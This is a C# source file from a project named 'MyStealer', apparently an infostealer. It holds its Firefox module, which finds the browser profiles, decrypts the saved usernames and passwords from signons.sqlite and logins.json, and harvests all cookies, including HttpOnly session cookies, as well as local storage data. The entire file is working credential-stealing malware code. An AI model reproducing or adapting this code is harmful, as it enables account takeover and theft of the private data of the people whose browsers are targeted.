using MyStealer.Collector.Utils;
using MyStealer.Decryptor;
using Newtonsoft.Json.Linq;
using Snappy;
using System;
using System.Collections.Generic;
using System.Collections.Immutable;
using System.Data.SQLite;
using System.IO;
using System.Text;

namespace MyStealer.Collector.Browser
{
    public class Firefox : BrowserCollectorBase
    {
        public override string ModuleName => "FireFox";

        protected virtual string ProfilesPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla", "FireFox", "Profiles");

        protected virtual string CookieSql => "SELECT name,value,host,path,expiry,lastAccessed,creationTime,isSecure,isHttpOnly,sameSite FROM moz_cookies;";

        public virtual string[] LibDirectory => new string[] { "Mozilla FireFox" };

        private IImmutableList<string> profilePathList;
        private IDictionary<string, MozillaDecryptor> profileDecryptor = new Dictionary<string, MozillaDecryptor>();

        public override bool IsAvailable() => Directory.Exists(ProfilesPath);

        public override void Initialize()
        {
            profilePathList = Directory.EnumerateDirectories(ProfilesPath, "*", SearchOption.TopDirectoryOnly).ToImmutableArray();

            var decryptors = ImmutableDictionary.CreateBuilder<string, MozillaDecryptor>();
            foreach (var profile in profilePathList)
            {
                try
                {
                    decryptors[profile] = new MozillaDecryptor(LibDirectory, profile);
                }
                catch (Exception e)
                {
                    Logger.Warning(e, "Failed to initialize decryptor for profile: {profile}", profile);
                }
            }

            profileDecryptor = decryptors.ToImmutable();
        }

        public override IImmutableSet<BrowserLogin> GetLogins()
        {
            var set = ImmutableHashSet.CreateBuilder<BrowserLogin>();

            foreach (var profilePath in profilePathList)
            {
                var profileName = Path.GetFileName(profilePath);
                var signonsCount = ReadSignonsSqlite(set, profileName, profilePath);
                var loginsCount = ReadLoginsJson(set, profileName, profilePath);
                Logger.Information("Read {scount} logins from signons.sqlite, {lcount} from logins.json of profile: {profile}", signonsCount, loginsCount, profileName);
            }

            return set.ToImmutable();
        }

        public override IImmutableSet<BrowserCookie> GetCookies()
        {
            var set = ImmutableHashSet.CreateBuilder<BrowserCookie>();

            foreach (var profilePath in profilePathList)
            {
                var profileName = Path.GetFileName(profilePath);
                var count = ReadCookiesSqlite(set, profileName, profilePath);
                Logger.Information("Read {count} cookies from profile: {profile}", count, profileName);
            }

            return set.ToImmutable();
        }

        public override IImmutableSet<BrowserLocalStorage> GetLocalStorageEntries()
        {
            var set = ImmutableHashSet.CreateBuilder<BrowserLocalStorage>();

            foreach (var profilePath in profilePathList)
            {
                var profileName = Path.GetFileName(profilePath);
                var storagesDir = Path.Combine(profilePath, "storage", "default");
                if (!Directory.Exists(storagesDir))
                    continue;

                foreach (var subDir in Directory.EnumerateDirectories(storagesDir))
                {
                    var count = ReadStorages(set, profileName, Path.Combine(subDir, "ls", "data.sqlite"));
                    Logger.Information("Read {count} storage entries from profile: {profile}", count, profileName);
                }
            }

            return set.ToImmutable();
        }

        protected int ReadSignonsSqlite(ISet<BrowserLogin> set, string profileName, string profilePath)
        {
            var dbPath = Path.Combine(profilePath, "signons.sqlite");
            if (!File.Exists(dbPath))
            {
                Logger.Warning("signons.sqlite file does not exists for profile: {profile}", profilePath);
                return 0;
            }

            Logger.Information("Begin parsing signons.sqlite file: {path}", dbPath);

            if (!profileDecryptor.TryGetValue(profilePath, out var decryptor))
            {
                Logger.Warning("Mozilla decryptor for profile {profile} is not available", profilePath);
                return 0;
            }

            var copyName = Path.GetRandomFileName();
            File.Copy(dbPath, copyName, true); // prevent reading locked sql database
            Logger.Debug("signons.sqlite file {path} copied to {randomName}", dbPath, copyName);

            var count = 0;
            try
            {
                using (var connection = new SQLiteConnection("Data Source=" + copyName).OpenAndReturn())
                using (var cmd = connection.CreateCommand())
                {
                    cmd.CommandText = "SELECT hostname,encryptedUsername,encryptedPassword FROM moz_logins;";

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            var host = reader.GetString(0);
                            var username = decryptor.Decrypt(reader.GetString(1));
                            var password = decryptor.Decrypt(reader.GetString(2));

                            if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(username))
                            {
                                count++;
                                set.Add(new BrowserLogin
                                {
                                    BrowserName = ModuleName,
                                    BrowserProfileName = profileName,
                                    Host = host,
                                    UserName = username,
                                    Password = password
                                });
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Logger.Warning(e, "Error reading signons.sqlite: {path}", dbPath);
            }
            finally
            {
                File.Delete(copyName);
                Logger.Information("Read {n} login entries from signons.sqlite: {path}", set.Count, dbPath);
            }

            return count;
        }

        protected int ReadLoginsJson(ISet<BrowserLogin> set, string profileName, string profilePath)
        {
            var jsonPath = Path.Combine(profilePath, "logins.json");
            if (!File.Exists(jsonPath))
            {
                Logger.Debug("No logins.json found from profile {profile}", profilePath);
                return 0;
            }

            Logger.Information("Begin parsing Login Data file: {path}", jsonPath);

            if (!profileDecryptor.TryGetValue(profilePath, out var decryptor))
            {
                Logger.Warning("Mozilla decryptor for profile {profile} is not available", profilePath);
                return 0;
            }

            var count = 0;
            try
            {
                var json = JObject.Parse(File.ReadAllText(jsonPath));
                foreach (var loginEntry in json["logins"])
                {
                    var host = loginEntry["hostname"].Value<string>();
                    var username = decryptor.Decrypt(loginEntry["encryptedUsername"].Value<string>());
                    var password = decryptor.Decrypt(loginEntry["encryptedPassword"].Value<string>());

                    count++;
                    set.Add(new BrowserLogin
                    {
                        BrowserName = ModuleName,
                        BrowserProfileName = profileName,
                        Host = host,
                        UserName = username,
                        Password = password
                    });
                }
            }
            catch (Exception ex)
            {
                Logger.Warning(ex, "Error parsing logins.json: {path}", jsonPath);
            }

            return count;
        }

        protected int ReadCookiesSqlite(ISet<BrowserCookie> set, string profileName, string profilePath)
        {
            var dbPath = Path.Combine(profilePath, "cookies.sqlite");
            if (!File.Exists(dbPath))
            {
                Logger.Warning("cookies.sqlite file does not exists for profile: {profile}", profilePath);
                return 0;
            }

            Logger.Information("Begin parsing cookies.sqlite file: {path}", dbPath);

            var copyName = Path.GetRandomFileName();
            File.Copy(dbPath, copyName, true); // prevent reading locked sql database
            Logger.Debug("cookies.sqlite file {path} copied to {randomName}", dbPath, copyName);

            var count = 0;
            try
            {
                using (var connection = new SQLiteConnection("Data Source=" + copyName).OpenAndReturn())
                using (var cmd = connection.CreateCommand())
                {
                    cmd.CommandText = CookieSql;

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            var name = reader.GetString(0);
                            var value = reader.GetString(1);
                            var host = reader.GetString(2);
                            var path = reader.GetString(3);
                            var expiry = reader.GetInt64(4);
                            var lastAccessed = reader.GetInt64(5);
                            var creationTime = reader.GetInt64(6);
                            var isSecure = reader.GetInt16(7);
                            var isHttpOnly = reader.GetInt16(8);
                            var sameSiteIndex = reader.GetOrdinal("sameSite");
                            var sameSite = sameSiteIndex >= 0 ? reader.GetInt16(9) : 0;

                            var expiryDate = new DateTime(expiry, DateTimeKind.Local);
                            var lastAccessedDate = new DateTime(lastAccessed, DateTimeKind.Local);
                            var creationTimeDate = new DateTime(creationTime, DateTimeKind.Local);

                            if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(name))
                            {
                                count++;
                                set.Add(new BrowserCookie
                                {
                                    BrowserName = $"{ModuleName}",
                                    BrowserProfileName = profileName,
                                    CreationDateTime = creationTimeDate,
                                    LastAccessDateTime = lastAccessedDate,
                                    ExpireDateTime = expiryDate,
                                    Host = host,
                                    Path = path,
                                    Name = name,
                                    Value = value,
                                    IsSecure = isSecure != 0,
                                    IsHttpOnly = isHttpOnly != 0,
                                    SameSite = sameSite,
                                    Priority = 1
                                });
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Logger.Warning(e, "Error reading cookies.sqlite: {path}", dbPath);
            }
            finally
            {
                File.Delete(copyName);
            }

            return count;
        }

        protected int ReadStorages(ISet<BrowserLocalStorage> set, string profileName, string dbPath)
        {
            if (!File.Exists(dbPath))
            {
                Logger.Warning("Local Storage data.sqlite file does not exists at: {path}", dbPath);
                return 0;
            }

            Logger.Information("Begin parsing data.sqlite file: {path}", dbPath);

            var copyName = Path.GetRandomFileName();
            File.Copy(dbPath, copyName, true); // prevent reading locked sql database
            Logger.Debug("cookies.sqlite file {path} copied to {randomName}", dbPath, copyName);

            var count = 0;
            try
            {
                using (var connection = new SQLiteConnection("Data Source=" + copyName).OpenAndReturn())
                {
                    string origin;
                    using (var cmd = connection.CreateCommand())
                    {
                        cmd.CommandText = "SELECT origin FROM database LIMIT 1;";
                        origin = cmd.ExecuteScalar().ToString();
                    }

                    using (var cmd = connection.CreateCommand())
                    {
                        cmd.CommandText = "SELECT key,utf16_length,compression_type,last_access_time,value FROM data;";

                        using (var reader = cmd.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                byte[] value = null;
                                try
                                {
                                    var key = reader.GetString(0);
                                    var utf16Length = reader.GetInt32(1);
                                    var snappyCompressed = reader.GetInt16(2) != 0; // https://stackoverflow.com/a/77335474
                                    var lastAccessed = new DateTime(reader.GetInt64(3), DateTimeKind.Local);
                                    var dataLen = (int)reader.GetBytes(4, 0L, null, 0, 0);
                                    value = BytePool.Alloc(dataLen);
                                    reader.GetBytes(4, 0L, value, 0, dataLen);

                                    if (snappyCompressed)
                                    {
                                        var uncompSize = SnappyCodec.GetUncompressedLength(value, 0, dataLen);
                                        var buffer = BytePool.Alloc(uncompSize);
                                        var written = SnappyCodec.Uncompress(value, 0, dataLen, buffer, 0);
                                        if (written != uncompSize)
                                            throw new Exception("Snappy decompression length mismatch");

                                        BytePool.Free(value); // free compressed buffer

                                        value = buffer;
                                    }

                                    count++;
                                    set.Add(new BrowserLocalStorage
                                    {
                                        BrowserName = $"{ModuleName}",
                                        BrowserProfileName = profileName,
                                        Host = origin,
                                        Key = key,
                                        Value = Encoding.Default.GetString(value), // Value is encoded with UTF-16-LE
                                        AccessTimeStamp = lastAccessed
                                    });
                                }
                                finally
                                {
                                    if (value != null)
                                        BytePool.Free(value);
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Logger.Warning(e, "Error reading data.sqlite: {path}", dbPath);
            }
            finally
            {
                File.Delete(copyName);
            }

            return count;
        }

        public override void Dispose()
        {
            foreach (var decryptor in profileDecryptor.Values)
                decryptor.Dispose();
        }
    }
}
